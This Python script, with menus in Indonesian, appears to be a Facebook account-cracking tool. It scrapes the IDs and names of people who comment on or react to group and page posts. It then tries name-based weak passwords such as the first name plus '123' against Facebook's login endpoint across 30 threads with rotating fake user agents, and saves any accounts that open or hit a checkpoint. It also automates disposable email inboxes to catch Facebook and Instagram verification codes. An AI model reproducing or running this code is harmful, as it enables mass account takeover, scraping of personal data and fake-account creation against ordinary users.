import pytube
import colorsys
import requests,bs4,sys,os,datetime,re,time,json,random,concurrent
from rich.console import Console
from rich import print as cetak
from rich import print as prints
from rich.panel import Panel
from bs4 import BeautifulSoup as bs
from datetime import datetime
from rich.panel import Panel as nel
from concurrent.futures import ThreadPoolExecutor
from rich.table import Table as me
from rich.tree import Tree
from concurrent.futures import ThreadPoolExecutor as tred
from rich.columns import Columns as col, Columns
from rich.progress import Progress,BarColumn,TextColumn, SpinnerColumn

pwnya=[]
pwpluss=[]
akun=[]
Meledak=[]
Cik=[]
console = Console()
okc = 'OK-result.txt'
cpc = 'CP-result.txt'
loop=0
ok=0
cp=0
method=[]
id = []
id2 = []
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
P2 = "[#FFFFFF]" # PUTIH
xyz = requests.Session()
dump = 0
result = []
cookie = ''
daftar_nama = []
ses = requests.Session()
head_email = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}
ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
head = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Cache-Control':'max-age=0','Dpr':'1.125','Sec-Ch-Prefers-Color-Scheme':'dark','Sec-Ch-Ua':'','Sec-Ch-Ua-Full-Version-List':'','Sec-Ch-Ua-Mobile':'?0','Sec-Ch-Ua-Model':'','Sec-Ch-Ua-Platform':'','Sec-Ch-Ua-Platform-Version':'','Sec-Fetch-Dest':'document','Sec-Fetch-Mode':'navigate','Sec-Fetch-Site':'none','Sec-Fetch-User':'?1','Upgrade-Insecure-Requests':'1','User-Agent':ua,'Viewport-Width':'924'}
hdg = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Cache-Control':'max-age=0','Dpr':'1.125','Sec-Ch-Prefers-Color-Scheme':'dark','Sec-Ch-Ua':'','Sec-Ch-Ua-Full-Version-List':'','Sec-Ch-Ua-Mobile':'?0','Sec-Ch-Ua-Model':'','Sec-Ch-Ua-Platform':'','Sec-Ch-Ua-Platform-Version':'','Sec-Fetch-Dest':'document','Sec-Fetch-Mode':'navigate','Sec-Fetch-Site':'none','Sec-Fetch-User':'?1','Upgrade-Insecure-Requests':'1','User-Agent':ua,'Viewport-Width':'924'}
hdp = {
        'Accept':'*/*',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'en-US,en;q=0.9',
        'Content-Type':'application/x-www-form-urlencoded',
        'Dpr':'1.25',
        'Origin':'https://m.facebook.com',
        'Sec-Ch-Prefers-Color-Scheme':'dark',
        'Sec-Ch-Ua':"",
        'Sec-Ch-Ua-Full-Version-List':"",
        'Sec-Ch-Ua-Mobile':'?1',
        'Sec-Ch-Ua-Model':"",
        'Sec-Ch-Ua-Platform':"",
        'Sec-Ch-Ua-Platform-Version':"",
        'Sec-Fetch-Dest':'empty',
        'Sec-Fetch-Mode':'cors',
        'Sec-Fetch-Site':'same-origin',
        'User-Agent' : ua,
        'X-Requested-With':'XMLHttpRequest',
        'X-Response-Format':'JSONStream'
    }
xyz = requests.Session()
result = []
dump = 0
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")
    else:os.system("clear")
    
def aguss():
    rr = random.randint
    rc = random.choice
    fbcr = str(
        random.choice([
            'TELKOMSEL', 'AXIS', 'Indosat', 'XL', '3SinyalKuatHemat',
            'Tsel-PakaiMasker', 'XL Axiata'
        ]))
    androversi = random.choice(["15_4", "14_3", "13_5", "14_5", "13_4"])
    build = ['MRA58K', 'UCC50Z', 'QKQ1.200127.002']
    andro = ['k', 'a', 'b', 'x', 'y', 'z', 'd', 'l']
    browser = ['HeyTapBrowser', 'MZBrowser']
    asep1 = random.choice(["Y6MLQN", "8G7LN3", "2783VM", "X35XFL", "W5T30Y"])
    asep4 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {androversi} like Mac OS X) AppleWebKit/{str(rr(500,800))}.{str(rr(2,50))} (KHTML, like Gecko) Version/{str(rr(10,20))}.{str(rr(4,80))} Mobile/{asep1} Safari/{str(rr(500,800))}.{str(rr(2,30))}"
    asep5 = f"Mozilla/5.0 (Linux; Android {androversi} SM-N960N Build/QP1A.190711.020; wv) AppleWebKit/{str(rr(500,800))}.{str(rr(2,50))} (KHTML, like Gecko) Version/4.0 Chrome/{rr(10,99)}.0.{rr(1000,9999)}.{rr(73,150)} Whale/1.0.0.0 Crosswalk/25.80.14.20 Mobile Safari/537.36 NAVER(inapp; search; 598; 10.28.2)"
    asep10 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; itel A663L Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Mobile Safari/537.36"
    asep6 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; Infinix X6832 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/455.0.0.44.88;]"
    asep7 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; V1818CA Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Mobile Safari/537.36 VivoBrowser/18.6.0.0"
    asep8 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; zh-tw; PCLM50 AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Mobile Safari/537.36 HeyTapBrowser/40.8.27.1"
    asep9 = f"Mozilla/5.0 (Linux; AndroId {str(rr(2,13))}; zh-CN; M2104K10AC Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} UCBrowser/16.3.8.1289 Mobile Safari/537.36"
    v1 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; meizu 17 Pro Build/{str(rc(build))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3000,4900))}.{str(rr(73,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/349.0.0.39.470;]"
    v2 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; meizu 17 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,99))}.0.{str(rr(3000,4999))}.{str(rr(73,150))} Mobile Safari/537.36"
    v3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(2,13))}; zh-CN; MZ-meizu 17 Pro Build/{str(rc(build))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3000,4999))}.{str(rr(73,150))} MZBrowser/8.{str(rr(1,20))}.1 Mobile Safari/537.36"
    v4 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; {str(rc(andro))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(59,169))}.0.0.0 Mobile Safari/537.36"
    hir = f"Mozilla/5.0 (Linux; U; Android {str(rr(2,13))}; zh-CN MZ-MEIZU 18 Build/{str(rc(build))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3000,4900))}.{str(rr(100,150))} {str(rc(browser))}/9.{str(rr(1,20))}.1 Mobile safari/537.36"
    ua_rmx = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; RMX{str(rr(1599,3999))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(89,120))}.0.{str(rr(3999,4999))}.{str(rr(55,129))} Mobile Safari/537.36"
    ua_oppo = f"Mozilla/5.0 (Linux; Android {str(rr(4,13))}; CPH{str(rr(1999,4999))} Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(59,159))}.0.{str(rr(2999,4999))}.{str(rr(55,159))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/280.0.0.48.122;]"
    ya = random.choice([hir, asep4,asep5, asep10, asep6, asep7, asep8, asep9, v1, v2, v3, v4,ua_rmx,ua_oppo])
    return ya
def pilihan():
    os.system('clear') 
    print("") 
    cetak(f"{M2}[ ──────────── [  {P2}{H2}Menu Pilihan{P2}  {M2}] ──────────── ]{P2}") 
    print("") 
    prints(f"{P2}1. Dump No Login Fb \t\t\t[ {H2}Aman{P2} ]\n2. Check Email And Kode \t\t[ {H2}Aman{P2} ]\n3. Create Fb \t\t\t\t[ {M2}Progress{P2} ]\n4. Crack Fb File \t\t\t[ {M2}Progress{P2} ]\n")
    cetak(f"{M2}[ ──────────── [  {P2}{H2}Menu Pilihan{P2}  {M2}] ──────────── ]{P2}") 
    print("") 
    su = input(f"└──╭➣ Pilihan 1 Sampai 4 : ") 
    if su in ["1"]:
        TimelineNoLogin()
    elif su in ["2"]:
        prints(Panel.fit("[bold white]Jika mengetahui nya maka tekan '[bold blue]y[bold white]' jika ingin melihat tutorial '[bold yellow]t[bold white]' ",style="bold blue"))
        i = input(f'└──╭➣ Pilihan : ')
        if i in ['y']:
            GetEmail()
        else:
            prints(Panel.fit(f"[bold green] Tutorial untuk check email dan kode facebook nya",style="bold blue"))
            tree = Tree(Panel.fit(f"[bold green]Pertama untuk check email",style="bold blue"))
            tree.add(f"[bold white] Buka halaman signup facebook lalu masukan data data")
            tree.add(f"[bold white] Terus Buka terminal dan jalan kan scrips saya dan memilih no 2")
            tree.add(f"[bold white] Nanti kita di tampilkan sebuah email")
            tree.add(f"[bold red] warning!!! waktu tetap berjalan jadi agak cepat untuk memasukan ke halaman signup fb sampai memunculkan halaman kode")
            tree.add(f"[bold white] setelah memasukan data data signup kamu di suruh masukan kode verify maka tunggu di terminal kamu selama 80 detik nanti akan keluar sebuah kode fb nya")
            prints(tree)
            time.sleep(20)
            pilihan()
    elif su in ["4"]:
        crack_file()
    else:
        exit()

def crack_file():
    file = input(f'Masukan Nama File Yang Di Sdcard Anda : ')
    try:
        uuid = open(file,'r').readlines()
        for data in uuid:
            try:id.append(data)
            except:exit(f" [ - ] pemisah salah")
            print('\r sedang dump %s id'%(len(id)),end=" ")
            time.sleep(0.0000003)
    except FileNotFoundError:exit(f"File Tidak Terbaca")
    print(f'\rtotal jumlah akun dump adalah {len(id)}')
    setting()
def setting():
    prints(Panel(f"[bold white]1. Crack Account  \n2. Crack Account New  \n3. Crack Account Random ",style='blue'))
    Al_alya = input(f"[ > ] masukan pilihan menu : ")
    if '1' in Al_alya:
        for tua in sorted(id):
            id2.append(tua)
    elif '2' in Al_alya:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif '3' in Al_alya:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:print('╰─ input correctly ');exit()
    prints(Panel(f"[bold white]1. Metode Account Api [ Data selain telkom ]",style='blue'))
    Al_alya = input(f"[ > ] masukan pilihan menu : ")
    if '1' in Al_alya:
        method.append('api')
    else:method.append('api')
    passwrd()
    
def passwrd():
    global prog,des,loop
    print("")
    loop+=len(id)
    Cik.append(Panel(f"[bold white]OK : %s[bold white]"%(okc),style="bold green"))
    Cik.append(Panel(f"[bold white]CP : %s[bold white]"%(cpc),style="bold green"))
    console.print(Columns(Cik))
    prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
    des = prog.add_task('',total=len(id))
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
                frs = nmf.split(' ')[0]
                pwv = []
                pwv = []
                if len(nmf)<6:
                    if len(frs)<3:
                        pass
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        pwv.append(frs+'123456')
                        pwv.append(frs+'321')
                else:
                    if len(frs)<3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        pwv.append(frs+'123456')
                        pwv.append(frs+'321')
                if 'ya' in pwpluss:
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:pass
                if 'api' in method:
                    pool.submit(crack,idf,pwv)
                else:
                    pool.submit(crack,idf,pwv)
        print('')
        sys.stdout.write('Berhasil Mengcrack %s Ok:%s Cp:%s Akuntod'%((len(id)),ok,cp))
        print('')
def crack(idf, pwv):
    global loop, ok, cp
    ses = requests.Session()
    prog.update(des, description=f'{loop} ok : {ok} cp : {cp}')
    prog.advance(des)
    ua = aguss()
    for pw in pwv:
        try:
            data = {
                "login_attempt": 0,
                "lwv": 101,
                "jazoest": 21138,
                "lsd": "AVqqezdnwnc",
                "display": "",
                "isprivate": "",
                "return_session": "",
                "skip_api_login": "",
                "signed_next": "",
                "trynum": 1,
                "timezone": -480,
                "lgndim": "eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6OTAwLCJjIjoyNH0=",
                "lgnrnd": "190607_aQpM",
                "lgnjs": 1738551968,
                "email": "sadasd",
                "prefill_contact_point": "sadasd",
                "prefill_source": "",
                "prefill_type": "contact_point",
                "first_prefill_source": "",
                "first_prefill_type": "contact_point",
                "had_cp_prefilled": True,
                "had_password_prefilled": False,
                "ab_test_data": "A/AVAAAAAAAVAAAAAAAAAAAAAAAAAAAAAAAAAAAAAfAA//AAAADAAA",
                "encpass": f"#PWD_BROWSER:5:1738551996:{pw}"
            }
            headers = {
                "Host": "m.facebook.com",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "content-length": 685,
                "content-type": "application/x-www-form-urlencoded",
                "dpr": "2",
                "origin": "https://m.facebook.com",
                "pragma": "no-cache",
                "priority": "u=0, i",
                "referer": f"https://m.facebook.com/login/web/?email={idf}&is_from_lara=1",
                "sec-ch-prefers-color-scheme": "dark",
                "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
                "sec-ch-ua-full-version-list": '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6834.160", "Google Chrome";v="132.0.6834.160"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-model": '""',
                "sec-ch-ua-platform": "macOS",
                "sec-ch-ua-platform-version": "14.6.1",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
                "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
                "viewport-width": "771"
            }
            po = ses.post("https://m.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100", data=data, headers=headers, allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                prints(f"{M2} Data Checkpoint")
                prints(f"{M2} id : [bold yellow]{idf}")
                prints(f"{M2} password : [bold yellow]{pw}")
                prints(f"{M2} user agent : [bold yellow]{ua}")
                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                akun.append(idf + '|' + pw)
                cp += 1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                prints(f"{H2} Data success")
                prints(f"{H2} id : {idf}")
                prints(f"{H2} password : {pw}")
                prints(f"{H2} user agent : {ua}")
                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + '\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(3)
    loop -= 1
def GetEmail():
    try:
        # Mendapatkan email sementara
        req = ses.get('https://10minutemail.net/m/?lang=id', headers=head_email, allow_redirects=True)
        req.raise_for_status()
        soup = bs(req.content, 'html.parser')
        ses_email = re.search(r'sessionid="(.*?)"', str(soup)).group(1)
        tim_email = str(time.time()).replace('.', '')[:13]
        dat = {'new': '1', 'sessionid': ses_email, '_': tim_email}
        email_response = ses.post(
            'https://10minutemail.net/address.api.php', 
            data=dat, headers=head_email, allow_redirects=True
        )
        email_response.raise_for_status()
        email_data = email_response.json()
        email = email_data['mail_get_mail']
        print(f"Email: {email}")

        # Menunggu beberapa saat untuk menerima email masuk
        time.sleep(80)
        dat['new'] = '0'
        mail_response = ses.post(
            'https://10minutemail.net/address.api.php', 
            data=dat, headers=head_email, allow_redirects=True
        )
        mail_response.raise_for_status()
        mail_data = mail_response.json()

        # Memeriksa isi email
        if 'mail_list' in mail_data:
            for mail in mail_data['mail_list']:
                # Deteksi kode Facebook
                if "Facebook" in mail['from']:
                    kode_fb = re.search(r'FB-(\d+)', mail['subject'])
                    if kode_fb:
                        print(f"Kode FB: {kode_fb.group(1)}")
                        return email, kode_fb.group(1)
                # Deteksi kode Instagram
                if "Instagram" in mail['from']:
                    kode_ig = re.search(r'(\d{6}) adalah kode Instagram Anda', mail['subject'])
                    if kode_ig:
                        print(f"Kode IG: {kode_ig.group(1)}")
                        return email, kode_ig.group(1)
        print("Kode tidak ditemukan.")
        return email, None
    except Exception as e:
        print(f"Kesalahan: {e}")
        return None, None

class TimelineNoLogin():
    def __init__(self,cookie=''):
        self.xyz = requests.Session()
        self.dump = 0
        self.result = []
        self.cookie = cookie
        self.ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
        self.head = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Cache-Control':'max-age=0','Dpr':'1.125','Sec-Ch-Prefers-Color-Scheme':'dark','Sec-Ch-Ua':'','Sec-Ch-Ua-Full-Version-List':'','Sec-Ch-Ua-Mobile':'?0','Sec-Ch-Ua-Model':'','Sec-Ch-Ua-Platform':'','Sec-Ch-Ua-Platform-Version':'','Sec-Fetch-Dest':'document','Sec-Fetch-Mode':'navigate','Sec-Fetch-Site':'none','Sec-Fetch-User':'?1','Upgrade-Insecure-Requests':'1','User-Agent':self.ua,'Viewport-Width':'924'}
        self.LandingTimeline()

    #--> Dump From Facebook Group
    def LandingTimeline(self):
        print("") 
        cetak(f"{M2}[ ──────────── [  {P2}{H2}Menu Dump{P2}  {M2}] ──────────── ]{P2}") 
        print("") 
        prints(f"{P2}1. Dump Grup \t\t\t\t[ {H2}Aman{P2} ]\n2. Dump Page \t\t\t\t[ {H2}Aman{P2} ]\n3. Dump Search Name \t\t\t[ {M2}Progress{P2} ]\n4. Dump Randm ID \t\t\t[ {M2}Progress{P2} ]\n")
        cetak(f"{M2}[ ──────────── [  {P2}{H2}Menu Dump{P2}  {M2}] ──────────── ]{P2}") 
        print("") 
        x = input('└──╭➣ Pilih 1 dan 4 : ')
        print('')
        if  x in ['1','01','a']:
            typ = 'Grup'
            idt = input('Masukkan ID Grup : ')
            url = f'https://www.facebook.com/groups/{idt}' #--> 175107520598383
            self.data_post, self.data_scrap = self.ScrapData(url,typ)
            print('Nama %s : %s'%(typ,self.data_scrap['name']))
            self.lim = int(input('Berapa ID : '))
            print('')
            self.ScrapOverall(type=typ)
        elif x in ['2','02','b']:
            typ = 'Page'
            idt = input('Masukkan ID Page : ')
            url = f'https://www.facebook.com/{idt}' #--> 100069058853738
            self.data_post, self.data_scrap = self.ScrapData(url,typ)
            print('Nama %s : %s'%(typ,self.data_scrap['name']))
            self.lim = int(input('Berapa ID : '))
            print('')
            self.ScrapOverall(type=typ)
        elif x in ['3','03','c']:
            SearchName()
        elif x in ['4','04','d']:
            RandomID()
        else:
            print('Isi Yang Benar!')
            exit()

    def ScrapData(self,url,type):
        try:
            req = bs(self.xyz.get(url,headers=self.head,cookies={'cookie':self.cookie},allow_redirects=True).content,'html.parser')
            data_post = {'av':re.search('__user=(.*?)&',str(req)).group(1),'__user':re.search('__user=(.*?)&',str(req)).group(1),'__a':re.search('__a=(.*?)&',str(req)).group(1),'__req':random.choice(['a','1','2','3','4','5']),'__hs':re.search('"haste_session":"(.*?)"',str(req)).group(1),'dpr':re.search('"pr":(.*?),',str(req)).group(1),'__ccg':random.choice(['EXCELLENT','GOOD']),'__rev':re.search('{"rev":(.*?)}',str(req)).group(1),'__hsi':re.search('"hsi":"(.*?)"',str(req)).group(1),'__comet_req':re.search('__comet_req=(.*?)&',str(req)).group(1),'lsd':re.search('"LSD",\[\],{"token":"(.*?)"}',str(req)).group(1),'jazoest':re.search('&jazoest=(.*?)"',str(req)).group(1),'__spin_r':re.search('"__spin_r":(.*?),',str(req)).group(1),'__spin_b':re.search('"__spin_b":"(.*?)"',str(req)).group(1),'__spin_t':re.search('"__spin_t":(.*?),',str(req)).group(1),'fb_api_caller_class':'RelayModern','server_timestamps':True}
            if type == 'Grup':
                data_scrap = {'id':re.search('"groupID":"(.*?)"',str(req)).group(1),'name':re.search('"meta":{"title":"(.*?)"',str(req)).group(1),'username':re.search('"idorvanity":"(.*?)"',str(req)).group(1),'f_location':re.search('"feedLocation":"(.*?)"',str(req)).group(1),'f_type':re.search('"feedType":"(.*?)"',str(req)).group(1)}
            elif type == 'Page':
                data_scrap = {'id':re.search('"userID":"(.*?)"',str(req)).group(1),'name':re.search('"meta":{"title":"(.*?)"',str(req)).group(1)}
            return(data_post,data_scrap)
        except Exception as e:
            print('ID Not Found or Something Went Wrong')
            exit()

    def ScrapOverall(self,type,cursor=None):
        if type == 'Grup':
            dtp, dtg = self.data_post.copy(), self.data_scrap.copy()
            var = {"UFI2CommentsProvider_commentsKey":"CometGroupDiscussionRootSuccessQuery","count":3,"cursor":cursor,"id":dtg['id'],"feedLocation":dtg['f_location'],"feedType":dtg['f_type'],"renderLocation":"group","stream_initial_count":1,"feedbackSource":0,"focusCommentID":None,"scale":1.5,"sortingSetting":None,"useDefaultActor":False,"privacySelectorRenderLocation":"COMET_STREAM","__relay_internal__pv__IsWorkUserrelayprovider":False,"__relay_internal__pv__IsMergQAPollsrelayprovider":False,"__relay_internal__pv__CometUFIIsRTAEnabledrelayprovider":False,"__relay_internal__pv__StoriesArmadilloReplyEnabledrelayprovider":False,"__relay_internal__pv__StoriesRingrelayprovider":False,"displayCommentsContextEnableComment":None,"displayCommentsContextIsAdPreview":None,"displayCommentsContextIsAggregatedShare":None,"displayCommentsContextIsStorySet":None,"displayCommentsFeedbackContext":None,}
            dtp.update({'fb_api_req_friendly_name':'GroupsCometFeedRegularStoriesPaginationQuery','variables':json.dumps(var),'doc_id':'6617440634998224'})
        elif type == 'Page':
            dtp, dtg = self.data_post.copy(), self.data_scrap.copy()
            var = {"UFI2CommentsProvider_commentsKey":"ProfileCometTimelineRoute","afterTime":None,"beforeTime":None,"count":3,"cursor":cursor,"displayCommentsContextEnableComment":None,"displayCommentsContextIsAdPreview":None,"displayCommentsContextIsAggregatedShare":None,"displayCommentsContextIsStorySet":None,"displayCommentsFeedbackContext":None,"feedLocation":"TIMELINE","feedbackSource":0,"focusCommentID":None,"memorializedSplitTimeFilter":None,"omitPinnedPost":True,"postedBy":None,"privacy":None,"privacySelectorRenderLocation":"COMET_STREAM","renderLocation":"timeline","scale":1.5,"stream_count":1,"taggedInOnly":None,"useDefaultActor":False,"id":dtg['id'],"__relay_internal__pv__IsWorkUserrelayprovider":False,"__relay_internal__pv__IsMergQAPollsrelayprovider":False,"__relay_internal__pv__CometUFIReactionsEnableShortNamerelayprovider":False,"__relay_internal__pv__CometUFIIsRTAEnabledrelayprovider":False,"__relay_internal__pv__StoriesArmadilloReplyEnabledrelayprovider":False,"__relay_internal__pv__StoriesRingrelayprovider":False}
            dtp.update({'fb_api_req_friendly_name':'ProfileCometTimelineFeedRefetchQuery','variables':json.dumps(var),'doc_id':'5689925947799218'})

        try:

            pos = self.xyz.post('https://www.facebook.com/api/graphql/',data=dtp,cookies={'cookie':self.cookie}).text
            feedback = list(set(re.findall('"feedback":{"id":"(.*?)"',str(pos))))
            with ThreadPoolExecutor(max_workers=30) as TPE:
                for x in list(set(re.findall(r'"__typename":"User","name":"(.*?)","id":"(.*?)"',str(pos)))):
                    if self.dump >= self.lim: break
                    else:
                        if 'short_name' in str(x): pass
                        else: TPE.submit(self.ScrapPost,list(x))
            with ThreadPoolExecutor(max_workers=30) as TPE:
                for fbid in feedback:
                    if self.dump >= self.lim: break
                    else: TPE.submit(self.ScrapComment,fbid)
            with ThreadPoolExecutor(max_workers=30) as TPE:
                for fbid in feedback:
                    if self.dump >= self.lim: break
                    else: TPE.submit(self.ScrapReact,fbid)
            if self.dump >= self.lim: pass
            else:
                try: self.ScrapOverall(type,re.search('"end_cursor":"(.*?)"',str(pos)).group(1))
                except Exception as e: pass
        except Exception as e: pass
    def ScrapPost(self,dat):
        try:
            ray = {'id':self.ConvertID(dat[-1]),'name':dat[0]}
            if 'pfbid' in ray['id']: pass
            else:
                if ray in self.result: pass
                else:
                    self.result.append(ray)
                    print('%s|%s'%(ray['id'],ray['name']))
                    open('result.txt','a+').write('%s|%s\n'%(ray['id'],ray['name']))
                    self.dump += 1
        except Exception as e: pass
    def ScrapComment(self,fbid):
        try:
            dtp = self.data_post.copy()
            dtp.update({'fb_api_req_friendly_name':'CometUFICommentsCountTooltipContentQuery','variables':json.dumps({"feedbackTargetID":fbid}),'doc_id':'6381324631954417'})
            pos = self.xyz.post('https://www.facebook.com/api/graphql/',data=dtp,cookies={'cookie':self.cookie}).json()
            for p in pos['data']['feedback']['commenters']['edges']:
                try:
                    ray = {'id':self.ConvertID(p['node']['id']),'name':p['node']['name']}
                    if 'pfbid' in ray['id']: pass
                    else:
                        if ray in self.result: pass
                        else:
                            self.result.append(ray)
                            print('%s|%s'%(ray['id'],ray['name']))
                            open('result.txt','a+').write('%s|%s\n'%(ray['id'],ray['name']))
                            self.dump += 1
                except Exception as e: pass
        except Exception as e: pass
    def ScrapReact(self,fbid):
        for react in ["1635855486666999","1678524932434102","115940658764963","478547315650144","908563459236466","444813342392137","613557422527858"]:
            try:
                dtp = self.data_post.copy()
                dtp.update({'fb_api_req_friendly_name':'CometUFIReactionIconTooltipContentQuery','variables':json.dumps({"feedbackTargetID":fbid,"reactionID":react}),'doc_id':'6235145276554312'})
                pos = self.xyz.post('https://www.facebook.com/api/graphql/',data=dtp,cookies={'cookie':self.cookie}).json()
                for p in pos['data']['feedback']['reactors']['nodes']:
                    try:
                        ray = {'id':self.ConvertID(p['id']),'name':p['name']}
                        if 'pfbid' in ray['id']: pass
                        else:
                            if ray in self.result: pass
                            else:
                                self.result.append(ray)
                                print('%s|%s'%(ray['id'],ray['name']))
                                open('result.txt','a+').write('%s|%s\n'%(ray['id'],ray['name']))
                                self.dump += 1
                    except Exception as e: pass
            except Exception as e: pass
    def ConvertID(self,id):
        try:
            r = requests.Session()
            q = r.get(f'https://web.facebook.com/{id}',headers=self.head,allow_redirects=True).text
            return(re.search('"userID":"(.*?)"',str(q)).group(1))
        except Exception as e: return(id)
        
class SearchName():
    def __init__(self):
        self.xyz = requests.Session()
        self.result = []
        self.dump = 0
        self.ua = 'Mozilla/5.0 (Linux; Android 11; vivo 1918 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.0000.00 Mobile Safari/537.36'
        self.hdg = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Cache-Control':'max-age=0','Dpr':'1.125','Sec-Ch-Prefers-Color-Scheme':'dark','Sec-Ch-Ua':"",'Sec-Ch-Ua-Full-Version-List':"",'Sec-Ch-Ua-Mobile':'?1','Sec-Ch-Ua-Model':"",'Sec-Ch-Ua-Platform':"",'Sec-Ch-Ua-Platform-Version':"",'Sec-Fetch-Dest':'document','Sec-Fetch-Mode':'navigate','Sec-Fetch-Site':'none','Sec-Fetch-User':'?1','Upgrade-Insecure-Requests':'1','User-Agent':self.ua}
